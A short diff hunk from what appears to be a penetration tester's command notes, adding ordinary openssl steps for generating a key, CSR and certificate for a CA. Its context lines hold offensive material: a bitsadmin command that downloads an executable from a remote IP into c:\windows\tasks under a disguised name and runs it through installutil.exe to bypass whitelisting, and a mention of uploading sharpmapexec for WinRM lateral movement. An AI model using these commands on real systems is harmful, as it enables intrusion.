@@ -1020,6 +1020,23 @@ runspace shortcut (cmd)
 bitsadmin /Transfer myJob http://192.168.10.11/Runspace.exe c:\windows\tasks\Tbsegabilly.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\Tbsegabilly.exe
 ```
+ssl cert generation, with a CA
+```
+# start with CSR
+openssl genrsa -out DOMAIN.com.key 4096
+openssl req -new -key DOMAIN.com.key -out DOMAIN.com.csr -utf8 -batch -subj '/CN=00security.com/emailAddress=info@DOMAIN.com'
+# output: DOMAIN.com.csr
+openssl req -x509 -new -nodes -key DOMAIN.com.key -sha256 -days 1024 -out DOMAIN.com.pem
+# output: DOMAIN.com.pem
+```
+```
+# submit DOMAIN.com.csr to the CA
+commonname: DOMAIN.com
+email: info@DOMAIN.com
+```
+```
+# once OK, download public key from CA as PEM
+```
 sharpmapexec usage - sme winrm
 ```
 upload sme.exe
